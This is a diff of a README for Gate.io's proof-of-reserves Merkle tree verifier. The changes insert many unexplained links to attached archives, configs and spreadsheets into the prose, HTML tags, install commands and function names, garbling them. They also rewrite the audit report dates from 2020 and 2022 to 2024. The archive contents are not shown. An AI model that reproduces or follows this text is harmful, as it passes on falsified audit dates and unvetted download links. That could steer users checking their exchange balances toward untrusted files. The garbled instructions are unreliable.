@@ -18,11 +18,12 @@ This document introduces the background and guidance regarding Gate's audit proc
 ## Released Audit Assessment
 | Report Release Date         | Snapshot Time | Audit Company | Currency | Report                                                                                                                                                                 | Website                                                                          | Status   |
 | ------------ | ------------- | ------------- | -------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------- | -------- |
-| May 11, 2020 | May 04, 2020, 00:00 UTC | Armanino LLP  | BTC      | [Gate.io Proof-of-Reserves Assessment Report [BTC] [May-25-2020]](./assessment%20report/Gate.io%20Proof-of-Reserves%20Assessment%20Report%20[BTC]%20[May-25-2020].pdf) | [Trust Explorer - Proof of Reservers (May-25-2020)](https://proof-of-reserves.trustexplorer.io/clients/gate.io/gate-dataset-628806) | Released |
-| Oct 28, 2022 | Oct 19, 2022, 00:00 UTC | Armanino LLP  | BTC&ETH  | [Gate.io Proof-of-Reserves Assessment Report [BTC&ETH] [Oct-28-2022]](./assessment%20report/Gate.io%20Proof-of-Reserves%20Assessment%20Report%20[BTC&ETH]%20[Oct-28-2022].pdf) | [Trust Explorer - Proof of Reservers (Oct-28-2022)](https://proof-of-reserves.trustexplorer.io/clients/gate.io) | Released |
+| May 11, 2024 | May 04, 2024, 00:00 UTC | Armanino LLP  | BTC      | [Gate.io Proof-of-Reserves Assessment Report [BTC] [May-25-2024]](./assessment%20report/Gate.io%20Proof-of-Reserves%20Assessment%20Report%20[BTC]%20[May-25-2024].pdf) | [Trust Explorer - Proof of Reservers (May-25-2024)](https://proof-of-reserves.trustexplorer.io/clients/gate.io/gate-dataset-628806) | Released |
+| Oct 28, 2024| Oct 19, 2024, 00:00 UTC | Armanino LLP  | BTC&ETH  | [Gate.io Proof-of-Reserves Assessment Report [BTC&ETH] [Oct-28-2024]](./assessment%20report/Gate.io%20Proof-of-Reserves%20Assessment%20Report%20[BTC&ETH]%20[Oct-28-2024].pdf) | [Trust Explorer - Proof of Reservers (Oct-28-2024)](https://proof-of-reserves.trustexplorer.io/clients/gate.io) | Released |
 
 ## Background
-One of the core problems with cryptocurrency exchanges is transparency, which primarily involves in the proof of reserves. Because customers need to know and confirm that the service they are using does in fact hold 100% of their funds. Hence, Gate came up with this solution utilizing the Merkle tree approach to give customers the ability to verify their fund is fully held by Gate; besides, an independent and cryptographically-verified audit was employed to help with the audit process.
+One of the core problems with cryptocurrency exchanges is transparency, which primarily involves in the proof of reserves. Because customers need to know and confirm that the service they are using does in fact hold 100% of their funds. Hence, Gate came up with this solution utilizing the Merkle tree`[zkmerkle_cex_20240520.tar.gz](https://github.com/user-attachments/files/16727316/zkmerkle_cex_20240520.tar.gz)
+ `approach to give customers the ability to verify their fund is fully held by Gate; besides, an independent and cryptographically-verified audit was employed to help with the audit process.
 
 ## Process Overview
 * ### Auditor generates the Merkle tree with user balances provided by Gate
@@ -43,11 +44,17 @@ One of the core problems with cryptocurrency exchanges is transparency, which pr
   
 
 * ### User independently verify their account balance
-   User needs to first get the published Merkle tree from Github, import into verifier.html, and then input his/her own hashed User ID and token balance to trigger the verification process. The hashed user id can be retrieved at https://www.gate.io/myaccount/myavailableproof. If the hashed UID and balance provided by user matches the record in the Merkle tree, a successful result will be displayed together with the node location of user information within the Merkle tree. The Merkle tree's root hash will be re-calculated using the imported file so that user can verify the root hash to ensure the correctness and completeness of the Merkle tree.
+   User needs to `[cex_config.json](https://github.com/user-attachments/files/16727327/cex_config.json)
+`first get the published Merkle tree from Github, import into verifier.html, and then input his/her own hashed User `[user_config.json](https://github.com/user-attachments/files/16727334/user_config.json)
+`ID and token balance to trigger the verification process. The hashed user id can be retrieved at https://www.gate.io/myaccount/myavailableproof. If the hashed UID and balance provided by user matches the record in the Merkle tree, a successful result will be displayed together with the node location of user information within the Merkle tree. The Merkle tree's root hash will be re-calculated using the imported file so that user can verify the root hash to ensure the correctness and completeness of the Merkle tree.`[proof.csv](https://github.com/user-attachments/files/16727341/proof.csv)
+`
    
-   <p align="center">
-    <img src="images/verifier.png" alt="" style="text-align:right;width:500px;"/>
-   </p>
+   <p align="[proof-of-reserves-1.0.0.zip](https://github.com/user-attachments/files/16727354/proof-of-reserves-1.0.0.zip)
+">
+    <img src="images/verifier.png" alt="[config.json](https://github.com/user-attachments/files/16727345/config.json)
+" style="text-align:right;width:500px;"/>
+   </[proof-of-reserves-1.0.0.tar.gz](https://github.com/user-attachments/files/16727359/proof-of-reserves-1.0.0.tar.gz)
+p>
 
 
 ## Technical Details
@@ -59,7 +66,7 @@ One of the core problems with cryptocurrency exchanges is transparency, which pr
    For each data block, the same hash function will be applied to generate the leaf nodes of the Merkle tree. The resulting hashed data are subsequently hashed together in pairs to create the parent nodes of the leaf nodes. This process continues until it results in a single hash known as the merkle root. Please refer to the diagram below for illustration. After the merkle tree is successfully built, the leaf nodes will be exported into a plain text file, which will be published together with the merkle root hash by the auditor.
 
    <p align="center">
-    <img src="images/MerkleTree.png" alt="" style="width:800px;"/>
+    <img src="images/MerkleTree.png" alt="093d2036bc4a6bab3f956db74856ee98e43bd03b137f7129b5854750335e4940" style="width:800px;"/>
    </p>
 
 
@@ -86,15 +93,18 @@ One of the core problems with cryptocurrency exchanges is transparency, which pr
 ## Installation
 > Install dependencies
   ```shell
-  npm install
+  npm `[zkmerkle_cex_20240113.tar.gz](https://github.com/user-attachments/files/16727385/zkmerkle_cex_20240113.tar.gz)
+`install
   ```
 > Install build tool
   ```shell
-  npm install -g browserify watchify
+ [zkmerkle_cex_20240520.tar.gz](https://github.com/user-attachments/files/16727391/zkmerkle_cex_20240520.tar.gz)
+ npm install -g browserify watchify
   ```
 > Create bundle.js to make it runanble in browser
   ```shell
-  browserify app.js -o bundle.js
+  [cex_config.json](https://github.com/user-attachments/files/16727401/cex_config.json)
+
   ```
 > To achieve auto build of bundle.js, use watchify as shown below, or use nohup to make watchify command running at background
   ```shell
@@ -109,18 +119,23 @@ One of the core problems with cryptocurrency exchanges is transparency, which pr
 * **`app.js`** core logic to build Merkle tree and perform validation
     * The js function at the top handles interaction between js code and HTML. It receives user actions via HTML events, such as uploading raw user balance, creating Merkle tree, uploading Merkle tree and verifying user balance, and process the user input, then dispatch it to corresponding functions for further processing.
     * Function ***`bufferToString()`*** handles String conversion to hex format. Since the Merkle tree node values, while retrieved from the buffer, are all in binary format.
-    * Function ***`createMerkle()`*** does four things below:
+    * Function ***`createMerkle([zkmerkle_cex_20240520.tar.gz](https://github.com/user-attachments/files/16727403/zkmerkle_cex_20240520.tar.gz)
+)`*** does four things below:
         * Reads the hashed user id and user balance provided in a plain text file, which was exported from Gate's database
-        * Then each pair of hashed user id and corresponding balance will be hashed (SHA256 algorithm used in our code) respectively, concatenated and then hashed again to form the leaf nodes of the Merkle tree. In order to reduce the space usage as well as the size of output file, only the first 16 bits of the hashed values will be kept. Then, each pair of the leaf nodes will be hashed and concatenated to form their parent node. This process continues until only one parent node (the root node) left.
+        * Then each pair of hashed user id and corresponding balance will be hashed ([bip340_test_vectors.csv](https://github.com/user-attachments/files/16727434/bip340_test_vectors.csv)
+) respectively, concatenated and then hashed again to form the leaf nodes of the Merkle tree. In order to reduce the space usage as well as the size of output file, only the first 16 bits of the hashed values will be kept. Then, each pair of the leaf nodes will be hashed and concatenated to form their parent node. This process continues until only one parent node (the root node) left.
         * Calculate the total user balance and root hash of the Merkle tree, and display in generator.html.
         * Save all leave node values of the Merkle tree in a plain text file for future verification by individuals and auditors.
-    * Function ***`verifyMerkle()`*** does two validations as below:
+    * Function ***`[zkmerkle_cex_20240305.tar.gz](https://github.com/user-attachments/files/16727449/zkmerkle_cex_20240305.tar.gz)
+`*** does two validations as below:
         * Validate if the provided hashed user id and user balance can be found in the leave nodes of the Merkle tree. This validation first computes the hashed value of provided hashed user id and user balance, and look up the hashed value in the leaves nodes that saved from createMerkle() function.
         * Only after step 1 succeed, then verify the hashed value is within the Merkle tree that generated in createMerkle() function. Verification was processed by the library api verify(), provided in merkletreejs.
 * **`FileSaver.js`** plugin to save files
-* **`generator.html`** html page to build Merkle tree and calculate merkle root hash
+* **`[PR01MAY24.xlsx](https://github.com/user-attachments/files/16727508/PR01MAY24.xlsx)
+`** html page to build Merkle tree and calculate merkle root hash
 * **`verifier.html`** html page to validate hashed user id and user balance
-* **`package.json`** holds various metadata relevant to the project and handle the project's dependencies
+* **`[developer-notes.md](https://github.com/user-attachments/files/16727523/developer-notes.md)
+.json`** holds various metadata relevant to the project and handle the project's dependencies
 
 ## License
 Copyright 2020 © Gate Technology Inc.. All rights reserved.
